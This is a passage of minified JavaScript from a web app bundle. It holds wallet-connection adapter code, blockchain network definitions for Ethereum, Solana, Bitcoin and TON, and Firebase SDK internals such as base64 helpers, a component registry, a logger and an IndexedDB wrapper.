o=Be.getNativeBalanceCacheForCaipAddress(i);if(o)return{balance:o.balance,symbol:o.symbol};const a=new Jue(r.rpcUrls.default.http[0],{chainId:r.id,name:r.name});if(a)try{return this.balancePromises[i]=new Promise(async c=>{try{const l=await a.getBalance(n),f=iD(l);Be.updateNativeBalanceCache({caipAddress:i,balance:f,symbol:r.nativeCurrency.symbol,timestamp:Date.now()}),c({balance:f,symbol:r.nativeCurrency.symbol})}catch{c({balance:"0.00",symbol:"ETH"})}}).finally(()=>{delete this.balancePromises[i]}),this.balancePromises[i]||{balance:"0.00",symbol:"ETH"}}catch{return{balance:"0.00",symbol:"ETH"}}}return{balance:"0.00",symbol:"ETH"}}async switchNetwork(e){const{caipNetwork:n}=e,r=Rn.getProviderId(n.chainNamespace),i=Rn.getProvider(n.chainNamespace);if(r==="AUTH"||r==="WALLET_CONNECT"){await super.switchNetwork(e);return}if(!i)throw new Error("Provider not found");try{await i?.request({method:"wallet_switchEthereumChain",params:[{chainId:f1.numberToHexString(n.id)}]})}catch(s){if(s.code===gp.ERROR_CODE_UNRECOGNIZED_CHAIN_ID||s.code===gp.ERROR_INVALID_CHAIN_ID||s.code===gp.ERROR_CODE_DEFAULT||s?.data?.originalError?.code===gp.ERROR_CODE_UNRECOGNIZED_CHAIN_ID)await f1.addEthereumChain(i,n);else if(r==="ANNOUNCED"||r==="EXTERNAL"||r==="INJECTED")throw new Error("Chain is not supported")}}getWalletConnectProvider(){return this.connectors.find(e=>e.type==="WALLET_CONNECT")?.provider}async revokeProviderPermissions(e){try{(await e.request({method:"wallet_getPermissions"})).find(i=>i.parentCapability==="eth_accounts")&&await e.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]})}catch(n){console.info("Could not revoke permissions from wallet. Disconnecting...",n)}}async getCapabilities(e){const n=Rn.getProvider(ge.CHAIN.EVM);if(!n)throw new Error("Provider is undefined");return await n.request({method:"wallet_getCapabilities",params:[e]})}async grantPermissions(e){const n=Rn.getProvider(ge.CHAIN.EVM);if(!n)throw new Error("Provider is undefined");return await n.request({method:"wallet_grantPermissions",params:e})}async revokePermissions(e){const n=Rn.getProvider(ge.CHAIN.EVM);if(!n)throw new Error("Provider is undefined");return await n.request({method:"wallet_revokePermissions",params:[e]})}async walletGetAssets(e){const n=Rn.getProvider(ge.CHAIN.EVM);if(!n)throw new Error("Provider is undefined");return await n.request({method:"wallet_getAssets",params:[e]})}toChecksummedAddress(e){try{return Vn(e.toLowerCase())}catch{return e}}}const fze=Wbe({id:1,name:"Ethereum",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},blockTime:12e3,rpcUrls:{default:{http:["https://eth.merkle.io"]}},blockExplorers:{default:{name:"Etherscan",url:"https://etherscan.io",apiUrl:"https://api.etherscan.io/api"}},contracts:{ensUniversalResolver:{address:"0xeeeeeeee14d718c2b47d9923deab1335e144eeee",blockCreated:23085558},multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:14353601}}});function m0(t){return{formatters:void 0,fees:void 0,serializers:void 0,...t}}m0({id:"5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",name:"Solana",network:"solana-mainnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!1,chainNamespace:"solana",caipNetworkId:"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",deprecatedCaipNetworkId:"solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ"});m0({id:"EtWTRABZaYq6iMfeYKouRu166VU2xqa1",name:"Solana Devnet",network:"solana-devnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1",deprecatedCaipNetworkId:"solana:8E9rvCKLFQia2Y35HXjjpWzj8weVo44K"});m0({id:"4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z",name:"Solana Testnet",network:"solana-testnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z"});m0({id:"000000000019d6689c085ae165831e93",caipNetworkId:"bip122:000000000019d6689c085ae165831e93",chainNamespace:"bip122",name:"Bitcoin",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}}});m0({id:"000000000933ea01ad0ee984209779ba",caipNetworkId:"bip122:000000000933ea01ad0ee984209779ba",chainNamespace:"bip122",name:"Bitcoin Testnet",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},testnet:!0});m0({id:"00000008819873e925422c1ff0f99f7c",caipNetworkId:"bip122:00000008819873e925422c1ff0f99f7c",chainNamespace:"bip122",name:"Bitcoin Signet",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},testnet:!0});m0({id:"-239",name:"TON",network:"ton-mainnet",nativeCurrency:{name:"TON",symbol:"TON",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Tonscan",url:"https://tonscan.org"}},testnet:!1,chainNamespace:"ton",caipNetworkId:"ton:-239"});m0({id:"-3",name:"TON Testnet",network:"ton-testnet",nativeCurrency:{name:"TON",symbol:"TON",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Tonscan",url:"https://testnet.tonscan.org"}},testnet:!0,chainNamespace:"ton",caipNetworkId:"ton:-3"});const hze=()=>{};var tne={};const jde=function(t){const e=[];let n=0;for(let r=0;r<t.length;r++){let i=t.charCodeAt(r);i<128?e[n++]=i:i<2048?(e[n++]=i>>6|192,e[n++]=i&63|128):(i&64512)===55296&&r+1<t.length&&(t.charCodeAt(r+1)&64512)===56320?(i=65536+((i&1023)<<10)+(t.charCodeAt(++r)&1023),e[n++]=i>>18|240,e[n++]=i>>12&63|128,e[n++]=i>>6&63|128,e[n++]=i&63|128):(e[n++]=i>>12|224,e[n++]=i>>6&63|128,e[n++]=i&63|128)}return e},pze=function(t){const e=[];let n=0,r=0;for(;n<t.length;){const i=t[n++];if(i<128)e[r++]=String.fromCharCode(i);else if(i>191&&i<224){const s=t[n++];e[r++]=String.fromCharCode((i&31)<<6|s&63)}else if(i>239&&i<365){const s=t[n++],o=t[n++],a=t[n++],c=((i&7)<<18|(s&63)<<12|(o&63)<<6|a&63)-65536;e[r++]=String.fromCharCode(55296+(c>>10)),e[r++]=String.fromCharCode(56320+(c&1023))}else{const s=t[n++],o=t[n++];e[r++]=String.fromCharCode((i&15)<<12|(s&63)<<6|o&63)}}return e.join("")},Mde={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(t,e){if(!Array.isArray(t))throw Error("encodeByteArray takes an array as a parameter");this.init_();const n=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let i=0;i<t.length;i+=3){const s=t[i],o=i+1<t.length,a=o?t[i+1]:0,c=i+2<t.length,l=c?t[i+2]:0,f=s>>2,h=(s&3)<<4|a>>4;let m=(a&15)<<2|l>>6,b=l&63;c||(b=64,o||(m=64)),r.push(n[f],n[h],n[m],n[b])}return r.join("")},encodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(t):this.encodeByteArray(jde(t),e)},decodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(t):pze(this.decodeStringToByteArray(t,e))},decodeStringToByteArray(t,e){this.init_();const n=e?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let i=0;i<t.length;){const s=n[t.charAt(i++)],a=i<t.length?n[t.charAt(i)]:0;++i;const l=i<t.length?n[t.charAt(i)]:64;++i;const h=i<t.length?n[t.charAt(i)]:64;if(++i,s==null||a==null||l==null||h==null)throw new mze;const m=s<<2|a>>4;if(r.push(m),l!==64){const b=a<<4&240|l>>2;if(r.push(b),h!==64){const w=l<<6&192|h;r.push(w)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let t=0;t<this.ENCODED_VALS.length;t++)this.byteToCharMap_[t]=this.ENCODED_VALS.charAt(t),this.charToByteMap_[this.byteToCharMap_[t]]=t,this.byteToCharMapWebSafe_[t]=this.ENCODED_VALS_WEBSAFE.charAt(t),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[t]]=t,t>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(t)]=t,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(t)]=t)}}};class mze extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const gze=function(t){const e=jde(t);return Mde.encodeByteArray(e,!0)},wI=function(t){return gze(t).replace(/\./g,"")},yze=function(t){try{return Mde.decodeString(t,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};function bze(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}const wze=()=>bze().__FIREBASE_DEFAULTS__,vze=()=>{if(typeof process>"u"||typeof tne>"u")return;const t=tne.__FIREBASE_DEFAULTS__;if(t)return JSON.parse(t)},Eze=()=>{if(typeof document>"u")return;let t;try{t=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=t&&yze(t[1]);return e&&JSON.parse(e)},MM=()=>{try{return hze()||wze()||vze()||Eze()}catch(t){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${t}`);return}},_ze=t=>MM()?.emulatorHosts?.[t],Aze=t=>{const e=_ze(t);if(!e)return;const n=e.lastIndexOf(":");if(n<=0||n+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const r=parseInt(e.substring(n+1),10);return e[0]==="["?[e.substring(1,n-1),r]:[e.substring(0,n),r]},Ude=()=>MM()?.config;class Cze{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}wrapCallback(e){return(n,r)=>{n?this.reject(n):this.resolve(r),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(n):e(n,r))}}}function UM(t){try{return(t.startsWith("http://")||t.startsWith("https://")?new URL(t).hostname:t).endsWith(".cloudworkstations.dev")}catch{return!1}}async function Sze(t){return(await fetch(t,{credentials:"include"})).ok}function Tze(t,e){if(t.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const n={alg:"none",type:"JWT"},r=e||"demo-project",i=t.iat||0,s=t.sub||t.user_id;if(!s)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const o={iss:`https://securetoken.google.com/${r}`,aud:r,iat:i,exp:i+3600,auth_time:i,sub:s,user_id:s,firebase:{sign_in_provider:"custom",identities:{}},...t};return[wI(JSON.stringify(n)),wI(JSON.stringify(o)),""].join(".")}const gE={};function xze(){const t={prod:[],emulator:[]};for(const e of Object.keys(gE))gE[e]?t.emulator.push(e):t.prod.push(e);return t}function Ize(t){let e=document.getElementById(t),n=!1;return e||(e=document.createElement("div"),e.setAttribute("id",t),n=!0),{created:n,element:e}}let nne=!1;function Rze(t,e){if(typeof window>"u"||typeof document>"u"||!UM(window.location.host)||gE[t]===e||gE[t]||nne)return;gE[t]=e;function n(m){return`__firebase__banner__${m}`}const r="__firebase__banner",s=xze().prod.length>0;function o(){const m=document.getElementById(r);m&&m.remove()}function a(m){m.style.display="flex",m.style.background="#7faaf0",m.style.position="fixed",m.style.bottom="5px",m.style.left="5px",m.style.padding=".5em",m.style.borderRadius="5px",m.style.alignItems="center"}function c(m,b){m.setAttribute("width","24"),m.setAttribute("id",b),m.setAttribute("height","24"),m.setAttribute("viewBox","0 0 24 24"),m.setAttribute("fill","none"),m.style.marginLeft="-6px"}function l(){const m=document.createElement("span");return m.style.cursor="pointer",m.style.marginLeft="16px",m.style.fontSize="24px",m.innerHTML=" &times;",m.onclick=()=>{nne=!0,o()},m}function f(m,b){m.setAttribute("id",b),m.innerText="Learn more",m.href="https://firebase.google.com/docs/studio/preview-apps#preview-backend",m.setAttribute("target","__blank"),m.style.paddingLeft="5px",m.style.textDecoration="underline"}function h(){const m=Ize(r),b=n("text"),w=document.getElementById(b)||document.createElement("span"),y=n("learnmore"),E=document.getElementById(y)||document.createElement("a"),A=n("preprendIcon"),R=document.getElementById(A)||document.createElementNS("http://www.w3.org/2000/svg","svg");if(m.created){const S=m.element;a(S),f(E,y);const v=l();c(R,A),S.append(R,w,E,v),document.body.appendChild(S)}s?(w.innerText="Preview backend disconnected.",R.innerHTML=`<g clip-path="url(#clip0_6013_33858)">
<path d="M4.8 17.6L12 5.6L19.2 17.6H4.8ZM6.91667 16.4H17.0833L12 7.93333L6.91667 16.4ZM12 15.6C12.1667 15.6 12.3056 15.5444 12.4167 15.4333C12.5389 15.3111 12.6 15.1667 12.6 15C12.6 14.8333 12.5389 14.6944 12.4167 14.5833C12.3056 14.4611 12.1667 14.4 12 14.4C11.8333 14.4 11.6889 14.4611 11.5667 14.5833C11.4556 14.6944 11.4 14.8333 11.4 15C11.4 15.1667 11.4556 15.3111 11.5667 15.4333C11.6889 15.5444 11.8333 15.6 12 15.6ZM11.4 13.6H12.6V10.4H11.4V13.6Z" fill="#212121"/>
</g>
<defs>
<clipPath id="clip0_6013_33858">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>`):(R.innerHTML=`<g clip-path="url(#clip0_6083_34804)">
<path d="M11.4 15.2H12.6V11.2H11.4V15.2ZM12 10C12.1667 10 12.3056 9.94444 12.4167 9.83333C12.5389 9.71111 12.6 9.56667 12.6 9.4C12.6 9.23333 12.5389 9.09444 12.4167 8.98333C12.3056 8.86111 12.1667 8.8 12 8.8C11.8333 8.8 11.6889 8.86111 11.5667 8.98333C11.4556 9.09444 11.4 9.23333 11.4 9.4C11.4 9.56667 11.4556 9.71111 11.5667 9.83333C11.6889 9.94444 11.8333 10 12 10ZM12 18.4C11.1222 18.4 10.2944 18.2333 9.51667 17.9C8.73889 17.5667 8.05556 17.1111 7.46667 16.5333C6.88889 15.9444 6.43333 15.2611 6.1 14.4833C5.76667 13.7056 5.6 12.8778 5.6 12C5.6 11.1111 5.76667 10.2833 6.1 9.51667C6.43333 8.73889 6.88889 8.06111 7.46667 7.48333C8.05556 6.89444 8.73889 6.43333 9.51667 6.1C10.2944 5.76667 11.1222 5.6 12 5.6C12.8889 5.6 13.7167 5.76667 14.4833 6.1C15.2611 6.43333 15.9389 6.89444 16.5167 7.48333C17.1056 8.06111 17.5667 8.73889 17.9 9.51667C18.2333 10.2833 18.4 11.1111 18.4 12C18.4 12.8778 18.2333 13.7056 17.9 14.4833C17.5667 15.2611 17.1056 15.9444 16.5167 16.5333C15.9389 17.1111 15.2611 17.5667 14.4833 17.9C13.7167 18.2333 12.8889 18.4 12 18.4ZM12 17.2C13.4444 17.2 14.6722 16.6944 15.6833 15.6833C16.6944 14.6722 17.2 13.4444 17.2 12C17.2 10.5556 16.6944 9.32778 15.6833 8.31667C14.6722 7.30555 13.4444 6.8 12 6.8C10.5556 6.8 9.32778 7.30555 8.31667 8.31667C7.30556 9.32778 6.8 10.5556 6.8 12C6.8 13.4444 7.30556 14.6722 8.31667 15.6833C9.32778 16.6944 10.5556 17.2 12 17.2Z" fill="#212121"/>
</g>
<defs>
<clipPath id="clip0_6083_34804">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>`,w.innerText="Preview backend running in this workspace."),w.setAttribute("id",b)}document.readyState==="loading"?window.addEventListener("DOMContentLoaded",h):h()}function Pze(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function Nze(){const t=MM()?.forceEnvironment;if(t==="node")return!0;if(t==="browser")return!1;try{return Object.prototype.toString.call(global.process)==="[object process]"}catch{return!1}}function Oze(){return!Nze()&&!!navigator.userAgent&&navigator.userAgent.includes("Safari")&&!navigator.userAgent.includes("Chrome")}function kze(){try{return typeof indexedDB=="object"}catch{return!1}}function Dze(){return new Promise((t,e)=>{try{let n=!0;const r="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(r);i.onsuccess=()=>{i.result.close(),n||self.indexedDB.deleteDatabase(r),t(!0)},i.onupgradeneeded=()=>{n=!1},i.onerror=()=>{e(i.error?.message||"")}}catch(n){e(n)}})}const Bze="FirebaseError";class Ew extends Error{constructor(e,n,r){super(n),this.code=e,this.customData=r,this.name=Bze,Object.setPrototypeOf(this,Ew.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,Lde.prototype.create)}}class Lde{constructor(e,n,r){this.service=e,this.serviceName=n,this.errors=r}create(e,...n){const r=n[0]||{},i=`${this.service}/${e}`,s=this.errors[e],o=s?jze(s,r):"Error",a=`${this.serviceName}: ${o} (${i}).`;return new Ew(i,a,r)}}function jze(t,e){return t.replace(Mze,(n,r)=>{const i=e[r];return i!=null?String(i):`<${r}?>`})}const Mze=/\{\$([^}]+)}/g;function vI(t,e){if(t===e)return!0;const n=Object.keys(t),r=Object.keys(e);for(const i of n){if(!r.includes(i))return!1;const s=t[i],o=e[i];if(rne(s)&&rne(o)){if(!vI(s,o))return!1}else if(s!==o)return!1}for(const i of r)if(!n.includes(i))return!1;return!0}function rne(t){return t!==null&&typeof t=="object"}function kg(t){return t&&t._delegate?t._delegate:t}class D_{constructor(e,n,r){this.name=e,this.instanceFactory=n,this.type=r,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}const Sm="[DEFAULT]";class Uze{constructor(e,n){this.name=e,this.container=n,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const n=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(n)){const r=new Cze;if(this.instancesDeferred.set(n,r),this.isInitialized(n)||this.shouldAutoInitialize())try{const i=this.getOrInitializeService({instanceIdentifier:n});i&&r.resolve(i)}catch{}}return this.instancesDeferred.get(n).promise}getImmediate(e){const n=this.normalizeInstanceIdentifier(e?.identifier),r=e?.optional??!1;if(this.isInitialized(n)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:n})}catch(i){if(r)return null;throw i}else{if(r)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(Fze(e))try{this.getOrInitializeService({instanceIdentifier:Sm})}catch{}for(const[n,r]of this.instancesDeferred.entries()){const i=this.normalizeInstanceIdentifier(n);try{const s=this.getOrInitializeService({instanceIdentifier:i});r.resolve(s)}catch{}}}}clearInstance(e=Sm){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(n=>"INTERNAL"in n).map(n=>n.INTERNAL.delete()),...e.filter(n=>"_delete"in n).map(n=>n._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=Sm){return this.instances.has(e)}getOptions(e=Sm){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:n={}}=e,r=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(r))throw Error(`${this.name}(${r}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const i=this.getOrInitializeService({instanceIdentifier:r,options:n});for(const[s,o]of this.instancesDeferred.entries()){const a=this.normalizeInstanceIdentifier(s);r===a&&o.resolve(i)}return i}onInit(e,n){const r=this.normalizeInstanceIdentifier(n),i=this.onInitCallbacks.get(r)??new Set;i.add(e),this.onInitCallbacks.set(r,i);const s=this.instances.get(r);return s&&e(s,r),()=>{i.delete(e)}}invokeOnInitCallbacks(e,n){const r=this.onInitCallbacks.get(n);if(r)for(const i of r)try{i(e,n)}catch{}}getOrInitializeService({instanceIdentifier:e,options:n={}}){let r=this.instances.get(e);if(!r&&this.component&&(r=this.component.instanceFactory(this.container,{instanceIdentifier:Lze(e),options:n}),this.instances.set(e,r),this.instancesOptions.set(e,n),this.invokeOnInitCallbacks(r,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,r)}catch{}return r||null}normalizeInstanceIdentifier(e=Sm){return this.component?this.component.multipleInstances?e:Sm:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function Lze(t){return t===Sm?void 0:t}function Fze(t){return t.instantiationMode==="EAGER"}class $ze{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const n=this.getProvider(e.name);if(n.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);n.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const n=new Uze(e,this);return this.providers.set(e,n),n}getProviders(){return Array.from(this.providers.values())}}var Tn;(function(t){t[t.DEBUG=0]="DEBUG",t[t.VERBOSE=1]="VERBOSE",t[t.INFO=2]="INFO",t[t.WARN=3]="WARN",t[t.ERROR=4]="ERROR",t[t.SILENT=5]="SILENT"})(Tn||(Tn={}));const Hze={debug:Tn.DEBUG,verbose:Tn.VERBOSE,info:Tn.INFO,warn:Tn.WARN,error:Tn.ERROR,silent:Tn.SILENT},zze=Tn.INFO,qze={[Tn.DEBUG]:"log",[Tn.VERBOSE]:"log",[Tn.INFO]:"info",[Tn.WARN]:"warn",[Tn.ERROR]:"error"},Vze=(t,e,...n)=>{if(e<t.logLevel)return;const r=new Date().toISOString(),i=qze[e];if(i)console[i](`[${r}]  ${t.name}:`,...n);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class Fde{constructor(e){this.name=e,this._logLevel=zze,this._logHandler=Vze,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in Tn))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?Hze[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,Tn.DEBUG,...e),this._logHandler(this,Tn.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,Tn.VERBOSE,...e),this._logHandler(this,Tn.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,Tn.INFO,...e),this._logHandler(this,Tn.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,Tn.WARN,...e),this._logHandler(this,Tn.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,Tn.ERROR,...e),this._logHandler(this,Tn.ERROR,...e)}}const Wze=(t,e)=>e.some(n=>t instanceof n);let ine,sne;function Gze(){return ine||(ine=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function Kze(){return sne||(sne=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const $de=new WeakMap,xD=new WeakMap,Hde=new WeakMap,gk=new WeakMap,LM=new WeakMap;function Zze(t){const e=new Promise((n,r)=>{const i=()=>{t.removeEventListener("success",s),t.removeEventListener("error",o)},s=()=>{n(Ep(t.result)),i()},o=()=>{r(t.error),i()};t.addEventListener("success",s),t.addEventListener("error",o)});return e.then(n=>{n instanceof IDBCursor&&$de.set(n,t)}).catch(()=>{}),LM.set(e,t),e}function Yze(t){if(xD.has(t))return;const e=new Promise((n,r)=>{const i=()=>{t.removeEventListener("complete",s),t.removeEventListener("error",o),t.removeEventListener("abort",o)},s=()=>{n(),i()},o=()=>{r(t.error||new DOMException("AbortError","AbortError")),i()};t.addEventListener("complete",s),t.addEventListener("error",o),t.addEventListener("abort",o)});xD.set(t,e)}let ID={get(t,e,n){if(t instanceof IDBTransaction){if(e==="done")return xD.get(t);if(e==="objectStoreNames")return t.objectStoreNames||Hde.get(t);if(e==="store")return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return Ep(t[e])},set(t,e,n){return t[e]=n,!0},has(t,e){return t instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in t}};function Qze(t){ID=t(ID)}function Jze(t){return t===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...n){const r=t.call(yk(this),e,...n);return Hde.set(r,e.sort?e.sort():[e]),Ep(r)}:Kze().includes(t)?function(...e){return t.apply(yk(this),e),Ep($de.get(this))}:function(...e){return Ep(t.apply(yk(this),e))}}function Xze(t){return typeof t=="function"?Jze(t):(t instanceof IDBTransaction&&Yze(t),Wze(t,Gze())?new Proxy(t,ID):t)}function Ep(t){if(t instanceof IDBRequest)return Zze(t);if(gk.has(t))return gk.get(t);const e=Xze(t);return e!==t&&(gk.set(t,e),LM.set(e,t)),e}const yk=t=>LM.get(t);function eqe(t,e,{blocked:n,upgrade:r,blocking:i,terminated:s}={}){const o=indexedDB.open(t,e),a=Ep(o);return r&&o.addEventListener("upgradeneeded",c=>{r(Ep(o.result),c.oldVersion,c.newVersion,Ep(o.transaction),c)}),n&&o.addEventListener("blocked",c=>n(c.oldVersion,c.newVersion,c)),a.then(c=>{s&&c.addEventListener("close",()=>s()),i&&c.addEventListener("versionchange",l=>i(l.oldVersion,l.newVersion,l))}).catch(()=>{}),a}const tqe=["get","getKey","getAll","getAllKeys","count"],nqe=["put","add","delete","clear"],bk=new Map;function one(t,e){if(!(t instanceof IDBDatabase&&!(e in t)&&typeof e=="string"))return;if(bk.get(e))return bk.get(e);const n=e.replace(/FromIndex$/,""),r=e!==n,i=nqe.includes(n);if(!(n in(r?IDBIndex:IDBObjectStore).prototype)||!(i||tqe.includes(n)))return;const s=async function(o,...a){const c=this.transaction(o,i?"readwrite":"readonly");let l=c.store;return r&&(l=l.index(a.shift())),(await Promise.all([l[n](...a),i&&c.done]))[0]};return bk.set(e,s),s}Qze(t=>({...t,get:(e,n,r)=>one(e,n)||t.get(e,n,r),has:(e,n)=>!!one(e,n)||t.has(e,n)}));class rqe{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(n=>{if(iqe(n)){const r=n.getImmediate();return`${r.library}/${r.version}`}else return null}).filter(n=>n).join(" ")}}function iqe(t){return t.getComponent()?.type==="VERSION"}const RD="@firebase/app",ane="0.14.6";const Hf=new Fde("@firebase/app"),sqe="@firebase/app-compat",oqe="@firebase/analytics-compat",aqe="@firebase/analytics",cqe="@firebase/app-check-compat",uqe="@firebase/app-check",lqe="@firebase/auth",dqe="@firebase/auth-compat",fqe="@firebase/database",hqe="@firebase/data-connect",pqe="@firebase/database-compat",mqe="@firebase/functions",gqe="@firebase/functions-compat",yqe="@firebase/installations",bqe="@firebase/installations-compat",wqe="@firebase/messaging",vqe="@firebase/messaging-compat",Eqe="@firebase/performance",_qe="@firebase/performance-compat",Aqe="@firebase/remote-config",Cqe="@firebase/remote-config-compat",Sqe="@firebase/storage",Tqe="@firebase/storage-compat",xqe="@firebase/firestore",Iqe="@firebase/ai",Rqe="@firebase/firestore-compat",Pqe="firebase",Nqe="12.6.0";const PD="[DEFAULT]",Oqe={[RD]:"fire-core",[sqe]:"fire-core-compat",[aqe]:"fire-analytics",[oqe]:"fire-analytics-compat",[uqe]:"fire-app-check",[cqe]:"fire-app-check-compat",[lqe]:"fire-auth",[dqe]:"fire-auth-compat",[fqe]:"fire-rtdb",[hqe]:"fire-data-connect",[pqe]:"fire-rtdb-compat",[mqe]:"fire-fn",[gqe]:"fire-fn-compat",[yqe]:"fire-iid",[bqe]:"fire-iid-compat",[wqe]:"fire-fcm",[vqe]:"fire-fcm-compat",[Eqe]:"fire-perf",[_qe]:"fire-perf-compat",[Aqe]:"fire-rc",[Cqe]:"fire-rc-compat",[Sqe]:"fire-gcs",[Tqe]:"fire-gcs-compat",[xqe]:"fire-fst",[Rqe]:"fire-fst-compat",[Iqe]:"fire-vertex","fire-js":"fire-js",[Pqe]:"fire-js-all"};const EI=new Map,kqe=new Map,ND=new Map;function cne(t,e){try{t.container.addComponent(e)}catch(n){Hf.debug(`Component ${e.name} failed to register with FirebaseApp ${t.name}`,n)}}function _I(t){const e=t.name;if(ND.has(e))return Hf.debug(`There were multiple attempts to register component ${e}.`),!1;ND.set(e,t);for(const n of EI.values())cne(n,t);for(const n of 